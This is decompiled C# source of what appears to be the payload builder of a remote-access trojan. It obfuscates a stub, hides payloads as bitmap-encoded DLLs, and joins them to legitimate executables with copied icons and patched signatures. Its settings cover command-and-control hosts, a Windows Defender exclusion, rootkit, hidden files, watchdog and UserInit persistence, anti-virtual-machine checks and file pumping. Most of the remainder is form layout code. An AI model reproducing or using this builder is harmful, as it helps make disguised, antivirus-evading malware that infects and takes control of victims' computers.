		using (ModuleDefMD moduleDefMD = ModuleDefMD.Load("Stub\\Joiner.exe"))
		{
			string text2 = Randomizer.LegalNaming[0] + ".dll";
			string text3 = Randomizer.LegalNaming[1] + ".dll";
			BitmapCoding.ByteToBitmap(File.ReadAllBytes(original)).Save(Path.Combine(Path.GetDirectoryName(bulid), text2), ImageFormat.Bmp);
			BitmapCoding.ByteToBitmap(File.ReadAllBytes(bulid)).Save(Path.Combine(Path.GetDirectoryName(bulid), text3), ImageFormat.Bmp);
			EncryptString encryptString = new EncryptString();
			string str = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
			encryptString.dec = Randomizer.Shuffle(str);
			encryptString.enc = Randomizer.Shuffle(encryptString.dec);
			foreach (TypeDef type in moduleDefMD.Types)
			{
				foreach (MethodDef method in type.Methods)
				{
					for (int i = 0; i < method.Body.Instructions.Count; i++)
					{
						if (method.Body.Instructions[i].OpCode != OpCodes.Ldstr)
						{
							continue;
						}
						switch (method.Body.Instructions[i].Operand.ToString())
						{
						case "%enc%":
							method.Body.Instructions[i].Operand = encryptString.enc;
							continue;
						case "%dec%":
							method.Body.Instructions[i].Operand = encryptString.dec;
							continue;
						case "%names%":
							method.Body.Instructions[i].Operand = encryptString.Encrypt(text2 + "," + text3);
							continue;
						case "%runas%":
							method.Body.Instructions[i].Operand = encryptString.Encrypt(true.ToString().ToLower());
							continue;
						case "%antivirtual%":
							method.Body.Instructions[i].Operand = encryptString.Encrypt(true.ToString().ToLower());
							continue;
						}
						if (!type.Name.Contains("Caesars"))
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt((string)method.Body.Instructions[i].Operand);
						}
					}
				}
			}
			Mixer.Execute(moduleDefMD);
			Renamer.Execute(moduleDefMD);
			ControlFlowObfuscation.Execute(moduleDefMD);
			ManyProxy.Execute(moduleDefMD);
			ProxyCall.Execute(moduleDefMD);
			ProxyString.Execute(moduleDefMD);
			Int.Execute(moduleDefMD);
			ProxyInt.Execute(moduleDefMD);
			Junks.Execute(moduleDefMD);
			moduleDefMD.Write(text);
			moduleDefMD.Dispose();
		}
		try
		{
			WriteAssembly(original, text);
		}
		catch
		{
		}
		IconInjector.InjectIcon(text, Methods.GetIcon(original));
		if (checkBox22.Checked)
		{
			PatchSignature(text, exd);
		}
	}

	private void rjButton8_Click(object sender, EventArgs e)
	{
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr";
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.OverwritePrompt = false;
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			CreateBulid(saveFileDialog.FileName);
			BulidDropper(saveFileDialog.FileName);
			MessageBox.Show("Build Create!");
		}
	}

	private void rjButton9_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Choose program";
		openFileDialog.Filter = "Files(*.exe)|*.exe";
		openFileDialog.Multiselect = false;
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr";
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.OverwritePrompt = false;
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			CreateBulid(saveFileDialog.FileName);
			BulidDropper(saveFileDialog.FileName);
			BulidJoin(openFileDialog.FileName, saveFileDialog.FileName);
			File.Delete(saveFileDialog.FileName);
			MessageBox.Show("Build Create!");
		}
	}

	private void rjButton10_Click(object sender, EventArgs e)
	{
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr";
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.OverwritePrompt = false;
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			CreateBulid(saveFileDialog.FileName);
			BulidDropper(saveFileDialog.FileName);
			Pump(saveFileDialog.FileName);
			MessageBox.Show("Build Create!");
		}
	}

	private void rjButton12_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = ".json (*.json)|*.json";
		openFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			BulidData bulidData = JsonConvert.DeserializeObject<BulidData>(File.ReadAllText(openFileDialog.FileName));
			checkBox20.Checked = bulidData.CheckIcon;
			checkBox21.Checked = bulidData.CheckAssembly;
			checkBox22.Checked = bulidData.DigitalSignature;
			if (bulidData.CheckIcon)
			{
				File.WriteAllBytes("local\\temp.ico", bulidData.Icon);
				pictureBox1.ImageLocation = "local\\temp.ico";
			}
			GridIps.Rows.Clear();
			string[] hosts = bulidData.Hosts;
			foreach (string value in hosts)
			{
				DataGridViewRow dataGridViewRow = new DataGridViewRow();
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = value
				});
				GridIps.Rows.Add(dataGridViewRow);
			}
			TextBoxProduct.Texts = bulidData.Product;
			TextBoxDescription.Texts = bulidData.Description;
			TextBoxCompany.Texts = bulidData.Company;
			TextBoxCopyright.Texts = bulidData.Copyright;
			TextBoxTrademarks.Texts = bulidData.Trademarks;
			TextBoxOriginalFileName.Texts = bulidData.OriginalFilename;
			TextBoxProductVersion.Texts = bulidData.ProductVersion;
			TextBoxFileVersion.Texts = bulidData.FileVersion;
			checkBox1.Checked = bulidData.Install;
			checkBox8.Checked = bulidData.ExclusionWD;
			checkBox6.Checked = bulidData.HiddenFile;
			checkBox4.Checked = bulidData.RootKit;
			checkBox9.Checked = bulidData.Pump;
			checkBox7.Checked = bulidData.UserInit;
			checkBox5.Checked = bulidData.InstallWatchDog;
			rjTextBox2.Texts = bulidData.TaskClient;
			rjTextBox5.Texts = bulidData.TaskWatchDog;
			rjComboBox1.Texts = bulidData.PathClientCmb;
			rjTextBox3.Texts = bulidData.PathClientBox;
			rjComboBox2.Texts = bulidData.PathWatchDogCmb;
			rjTextBox4.Texts = bulidData.PathWatchDogBox;
			rjTextBox7.Texts = bulidData.Group;
			rjTextBox6.Texts = bulidData.Mutex;
		}
	}

	private void rjButton11_Click(object sender, EventArgs e)
	{
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = ".json (*.json)|*.json";
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		if (saveFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		BulidData bulidData = new BulidData();
		bulidData.CheckIcon = checkBox20.Checked;
		bulidData.CheckAssembly = checkBox21.Checked;
		bulidData.DigitalSignature = checkBox22.Checked;
		bulidData.Icon = (checkBox20.Checked ? File.ReadAllBytes(pictureBox1.ImageLocation) : null);
		bulidData.Product = TextBoxProduct.Texts;
		bulidData.Description = TextBoxDescription.Texts;
		bulidData.Company = TextBoxCompany.Texts;
		bulidData.Copyright = TextBoxCopyright.Texts;
		bulidData.Trademarks = TextBoxTrademarks.Texts;
		bulidData.OriginalFilename = TextBoxOriginalFileName.Texts;
		bulidData.ProductVersion = TextBoxProductVersion.Texts;
		bulidData.FileVersion = TextBoxFileVersion.Texts;
		bulidData.Install = checkBox1.Checked;
		bulidData.ExclusionWD = checkBox8.Checked;
		bulidData.HiddenFile = checkBox6.Checked;
		bulidData.RootKit = checkBox4.Checked;
		bulidData.Pump = checkBox9.Checked;
		bulidData.UserInit = checkBox7.Checked;
		bulidData.InstallWatchDog = checkBox5.Checked;
		bulidData.TaskClient = rjTextBox2.Texts;
		bulidData.TaskWatchDog = rjTextBox5.Texts;
		bulidData.PathClientCmb = rjComboBox1.Texts;
		bulidData.PathClientBox = rjTextBox3.Texts;
		bulidData.PathWatchDogCmb = rjComboBox2.Texts;
		bulidData.PathWatchDogBox = rjTextBox4.Texts;
		bulidData.Group = rjTextBox7.Texts;
		bulidData.Mutex = rjTextBox6.Texts;
		List<string> list = new List<string>();
		foreach (DataGridViewRow item in (IEnumerable)GridIps.Rows)
		{
			list.Add((string)item.Cells[0].Value);
		}
		bulidData.Hosts = list.ToArray();
		File.WriteAllText(saveFileDialog.FileName, JsonConvert.SerializeObject(bulidData, Formatting.Indented));
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormBulider));
		this.materialTabControl1 = new MaterialSkin.Controls.MaterialTabControl();
		this.tabPage1 = new System.Windows.Forms.TabPage();
		this.rjButton12 = new CustomControls.RJControls.RJButton();
		this.rjButton11 = new CustomControls.RJControls.RJButton();
		this.rjButton4 = new CustomControls.RJControls.RJButton();
		this.rjTextBox6 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox7 = new CustomControls.RJControls.RJTextBox();
		this.rjButton2 = new CustomControls.RJControls.RJButton();
		this.rjTextBox1 = new CustomControls.RJControls.RJTextBox();
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.GridIps = new System.Windows.Forms.DataGridView();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.tabPage2 = new System.Windows.Forms.TabPage();
		this.panel1 = new System.Windows.Forms.Panel();
		this.checkBox7 = new System.Windows.Forms.CheckBox();
		this.checkBox9 = new System.Windows.Forms.CheckBox();
		this.checkBox8 = new System.Windows.Forms.CheckBox();
		this.rjTextBox5 = new CustomControls.RJControls.RJTextBox();
		this.checkBox6 = new System.Windows.Forms.CheckBox();
		this.rjComboBox2 = new CustomControls.RJControls.RJComboBox();
		this.rjTextBox4 = new CustomControls.RJControls.RJTextBox();
		this.checkBox5 = new System.Windows.Forms.CheckBox();
		this.rjComboBox1 = new CustomControls.RJControls.RJComboBox();
		this.rjTextBox3 = new CustomControls.RJControls.RJTextBox();
		this.checkBox4 = new System.Windows.Forms.CheckBox();
		this.rjTextBox2 = new CustomControls.RJControls.RJTextBox();
		this.checkBox1 = new System.Windows.Forms.CheckBox();
		this.tabPage3 = new System.Windows.Forms.TabPage();
		this.checkBox22 = new System.Windows.Forms.CheckBox();
		this.panel4 = new System.Windows.Forms.Panel();
		this.rjButton3 = new CustomControls.RJControls.RJButton();
		this.checkBox21 = new System.Windows.Forms.CheckBox();
		this.TextBoxFileVersion = new CustomControls.RJControls.RJTextBox();
		this.TextBoxProductVersion = new CustomControls.RJControls.RJTextBox();
		this.TextBoxOriginalFileName = new CustomControls.RJControls.RJTextBox();
		this.TextBoxTrademarks = new CustomControls.RJControls.RJTextBox();
		this.TextBoxCopyright = new CustomControls.RJControls.RJTextBox();
		this.TextBoxCompany = new CustomControls.RJControls.RJTextBox();
		this.TextBoxDescription = new CustomControls.RJControls.RJTextBox();
		this.TextBoxProduct = new CustomControls.RJControls.RJTextBox();
		this.panel3 = new System.Windows.Forms.Panel();
		this.checkBox20 = new System.Windows.Forms.CheckBox();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.tabPage4 = new System.Windows.Forms.TabPage();
		this.rjButton10 = new CustomControls.RJControls.RJButton();
		this.rjButton9 = new CustomControls.RJControls.RJButton();
		this.rjButton8 = new CustomControls.RJControls.RJButton();
		this.rjButton7 = new CustomControls.RJControls.RJButton();
		this.rjButton6 = new CustomControls.RJControls.RJButton();
		this.rjButton5 = new CustomControls.RJControls.RJButton();
		this.imageList1 = new System.Windows.Forms.ImageList(this.components);
		this.materialTabControl1.SuspendLayout();
		this.tabPage1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.GridIps).BeginInit();
		this.tabPage2.SuspendLayout();
		this.panel1.SuspendLayout();
		this.tabPage3.SuspendLayout();
		this.panel4.SuspendLayout();
		this.panel3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		this.tabPage4.SuspendLayout();
		base.SuspendLayout();
		this.materialTabControl1.Controls.Add(this.tabPage1);
		this.materialTabControl1.Controls.Add(this.tabPage2);
		this.materialTabControl1.Controls.Add(this.tabPage3);
		this.materialTabControl1.Controls.Add(this.tabPage4);
		this.materialTabControl1.Depth = 0;
		this.materialTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.materialTabControl1.ImageList = this.imageList1;
		this.materialTabControl1.Location = new System.Drawing.Point(3, 64);
		this.materialTabControl1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialTabControl1.Multiline = true;
		this.materialTabControl1.Name = "materialTabControl1";
		this.materialTabControl1.SelectedIndex = 0;
		this.materialTabControl1.Size = new System.Drawing.Size(873, 402);
		this.materialTabControl1.TabIndex = 0;
		this.tabPage1.Controls.Add(this.rjButton12);
		this.tabPage1.Controls.Add(this.rjButton11);
		this.tabPage1.Controls.Add(this.rjButton4);
		this.tabPage1.Controls.Add(this.rjTextBox6);
		this.tabPage1.Controls.Add(this.rjTextBox7);
		this.tabPage1.Controls.Add(this.rjButton2);
		this.tabPage1.Controls.Add(this.rjTextBox1);
		this.tabPage1.Controls.Add(this.rjButton1);
		this.tabPage1.Controls.Add(this.GridIps);
		this.tabPage1.ImageKey = "server_78939.png";
		this.tabPage1.Location = new System.Drawing.Point(4, 39);
		this.tabPage1.Name = "tabPage1";
		this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage1.Size = new System.Drawing.Size(865, 359);
		this.tabPage1.TabIndex = 0;
		this.tabPage1.Text = "Connect";
		this.tabPage1.UseVisualStyleBackColor = true;
		this.rjButton12.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton12.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton12.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton12.BorderRadius = 0;
		this.rjButton12.BorderSize = 0;
		this.rjButton12.FlatAppearance.BorderSize = 0;
		this.rjButton12.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton12.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton12.ForeColor = System.Drawing.Color.White;
		this.rjButton12.Location = new System.Drawing.Point(682, 13);
		this.rjButton12.Name = "rjButton12";
		this.rjButton12.Size = new System.Drawing.Size(74, 31);
		this.rjButton12.TabIndex = 50;
		this.rjButton12.Text = "Import";
		this.rjButton12.TextColor = System.Drawing.Color.White;
		this.rjButton12.UseVisualStyleBackColor = false;
		this.rjButton12.Click += new System.EventHandler(rjButton12_Click);
		this.rjButton11.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton11.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton11.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton11.BorderRadius = 0;
		this.rjButton11.BorderSize = 0;
		this.rjButton11.FlatAppearance.BorderSize = 0;
		this.rjButton11.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton11.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton11.ForeColor = System.Drawing.Color.White;
		this.rjButton11.Location = new System.Drawing.Point(602, 13);
		this.rjButton11.Name = "rjButton11";
		this.rjButton11.Size = new System.Drawing.Size(74, 31);
		this.rjButton11.TabIndex = 49;
		this.rjButton11.Text = "Save to";
		this.rjButton11.TextColor = System.Drawing.Color.White;
		this.rjButton11.UseVisualStyleBackColor = false;
		this.rjButton11.Click += new System.EventHandler(rjButton11_Click);
		this.rjButton4.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton4.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton4.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton4.BorderRadius = 0;
		this.rjButton4.BorderSize = 0;
		this.rjButton4.FlatAppearance.BorderSize = 0;
		this.rjButton4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton4.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton4.ForeColor = System.Drawing.Color.White;
		this.rjButton4.Location = new System.Drawing.Point(602, 52);
		this.rjButton4.Name = "rjButton4";
		this.rjButton4.Size = new System.Drawing.Size(74, 31);
		this.rjButton4.TabIndex = 48;
		this.rjButton4.Text = "Generate";
		this.rjButton4.TextColor = System.Drawing.Color.White;
		this.rjButton4.UseVisualStyleBackColor = false;
		this.rjButton4.Click += new System.EventHandler(rjButton4_Click);
		this.rjTextBox6.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox6.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox6.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox6.BorderRadius = 0;
		this.rjTextBox6.BorderSize = 1;
		this.rjTextBox6.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox6.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox6.Location = new System.Drawing.Point(355, 52);
		this.rjTextBox6.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox6.Multiline = false;
		this.rjTextBox6.Name = "rjTextBox6";
		this.rjTextBox6.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox6.PasswordChar = false;
		this.rjTextBox6.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox6.PlaceholderText = "Mutex";
		this.rjTextBox6.Size = new System.Drawing.Size(240, 31);
		this.rjTextBox6.TabIndex = 47;
		this.rjTextBox6.Texts = "";
		this.rjTextBox6.UnderlinedStyle = false;
		this.rjTextBox7.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox7.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox7.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox7.BorderRadius = 0;
		this.rjTextBox7.BorderSize = 1;
		this.rjTextBox7.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox7.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox7.Location = new System.Drawing.Point(355, 13);
		this.rjTextBox7.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox7.Multiline = false;
		this.rjTextBox7.Name = "rjTextBox7";
		this.rjTextBox7.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox7.PasswordChar = false;
		this.rjTextBox7.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox7.PlaceholderText = "Group";
		this.rjTextBox7.Size = new System.Drawing.Size(240, 31);
		this.rjTextBox7.TabIndex = 31;
		this.rjTextBox7.Texts = "";
		this.rjTextBox7.UnderlinedStyle = false;
		this.rjButton2.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton2.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton2.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton2.BorderRadius = 0;
		this.rjButton2.BorderSize = 0;
		this.rjButton2.FlatAppearance.BorderSize = 0;
		this.rjButton2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton2.Font = new System.Drawing.Font("Arial", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton2.ForeColor = System.Drawing.Color.White;
		this.rjButton2.Location = new System.Drawing.Point(316, 13);
		this.rjButton2.Name = "rjButton2";
		this.rjButton2.Size = new System.Drawing.Size(32, 31);
		this.rjButton2.TabIndex = 14;
		this.rjButton2.Text = "-";
		this.rjButton2.TextColor = System.Drawing.Color.White;
		this.rjButton2.UseVisualStyleBackColor = false;
		this.rjButton2.Click += new System.EventHandler(rjButton2_Click);
		this.rjTextBox1.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox1.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox1.BorderRadius = 0;
		this.rjTextBox1.BorderSize = 1;
		this.rjTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox1.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox1.Location = new System.Drawing.Point(21, 13);
		this.rjTextBox1.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox1.Multiline = false;
		this.rjTextBox1.Name = "rjTextBox1";
		this.rjTextBox1.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox1.PasswordChar = false;
		this.rjTextBox1.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox1.PlaceholderText = "Host";
		this.rjTextBox1.Size = new System.Drawing.Size(250, 31);
		this.rjTextBox1.TabIndex = 13;
		this.rjTextBox1.Texts = "";
		this.rjTextBox1.UnderlinedStyle = false;
		this.rjButton1.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton1.BorderRadius = 0;
		this.rjButton1.BorderSize = 0;
		this.rjButton1.FlatAppearance.BorderSize = 0;
		this.rjButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton1.Font = new System.Drawing.Font("Arial", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton1.ForeColor = System.Drawing.Color.White;
		this.rjButton1.Location = new System.Drawing.Point(278, 13);
		this.rjButton1.Name = "rjButton1";
		this.rjButton1.Size = new System.Drawing.Size(32, 31);
		this.rjButton1.TabIndex = 12;
		this.rjButton1.Text = "+";
		this.rjButton1.TextColor = System.Drawing.Color.White;
		this.rjButton1.UseVisualStyleBackColor = false;
		this.rjButton1.Click += new System.EventHandler(rjButton1_Click);
		this.GridIps.AllowUserToAddRows = false;
		this.GridIps.AllowUserToDeleteRows = false;
		this.GridIps.AllowUserToResizeColumns = false;
		this.GridIps.AllowUserToResizeRows = false;
		this.GridIps.BackgroundColor = System.Drawing.Color.White;
		this.GridIps.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.GridIps.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.GridIps.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridIps.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.GridIps.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.GridIps.Columns.AddRange(this.Column1);
		this.GridIps.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.GridIps.DefaultCellStyle = dataGridViewCellStyle2;
		this.GridIps.EnableHeadersVisualStyles = false;
		this.GridIps.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.GridIps.Location = new System.Drawing.Point(21, 51);
		this.GridIps.Name = "GridIps";
		this.GridIps.ReadOnly = true;
		this.GridIps.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridIps.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.GridIps.RowHeadersVisible = false;
		this.GridIps.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.GridIps.ShowCellErrors = false;
		this.GridIps.ShowCellToolTips = false;
		this.GridIps.ShowEditingIcon = false;
		this.GridIps.ShowRowErrors = false;
		this.GridIps.Size = new System.Drawing.Size(327, 307);
		this.GridIps.TabIndex = 11;
		this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column1.HeaderText = "Host";
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		this.tabPage2.Controls.Add(this.panel1);
		this.tabPage2.Controls.Add(this.checkBox1);
		this.tabPage2.ImageKey = "settings-cogwheel-button_icon-icons.com_72559.png";
		this.tabPage2.Location = new System.Drawing.Point(4, 39);
		this.tabPage2.Name = "tabPage2";
		this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage2.Size = new System.Drawing.Size(865, 359);
		this.tabPage2.TabIndex = 1;
		this.tabPage2.Text = "Install Settings";
		this.tabPage2.UseVisualStyleBackColor = true;
		this.panel1.Controls.Add(this.checkBox7);
		this.panel1.Controls.Add(this.checkBox9);
		this.panel1.Controls.Add(this.checkBox8);
		this.panel1.Controls.Add(this.rjTextBox5);
		this.panel1.Controls.Add(this.checkBox6);
		this.panel1.Controls.Add(this.rjComboBox2);
		this.panel1.Controls.Add(this.rjTextBox4);
		this.panel1.Controls.Add(this.checkBox5);
		this.panel1.Controls.Add(this.rjComboBox1);
		this.panel1.Controls.Add(this.rjTextBox3);
		this.panel1.Controls.Add(this.checkBox4);
		this.panel1.Controls.Add(this.rjTextBox2);
		this.panel1.Enabled = false;
		this.panel1.Location = new System.Drawing.Point(6, 68);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(783, 298);
		this.panel1.TabIndex = 1;
		this.checkBox7.AutoSize = true;
		this.checkBox7.Location = new System.Drawing.Point(12, 140);
		this.checkBox7.Name = "checkBox7";
		this.checkBox7.Size = new System.Drawing.Size(65, 17);
		this.checkBox7.TabIndex = 28;
		this.checkBox7.Text = "User Init";
		this.checkBox7.UseVisualStyleBackColor = true;
		this.checkBox9.AutoSize = true;
		this.checkBox9.Location = new System.Drawing.Point(12, 117);
		this.checkBox9.Name = "checkBox9";
		this.checkBox9.Size = new System.Drawing.Size(53, 17);
		this.checkBox9.TabIndex = 27;
		this.checkBox9.Text = "Pump";
		this.checkBox9.UseVisualStyleBackColor = true;
		this.checkBox8.AutoSize = true;
		this.checkBox8.Location = new System.Drawing.Point(12, 48);
		this.checkBox8.Name = "checkBox8";
		this.checkBox8.Size = new System.Drawing.Size(93, 17);
		this.checkBox8.TabIndex = 26;
		this.checkBox8.Text = "Exclusion WD";
		this.checkBox8.UseVisualStyleBackColor = true;
		this.rjTextBox5.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox5.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox5.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox5.BorderRadius = 0;
		this.rjTextBox5.BorderSize = 1;
		this.rjTextBox5.Enabled = false;
		this.rjTextBox5.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
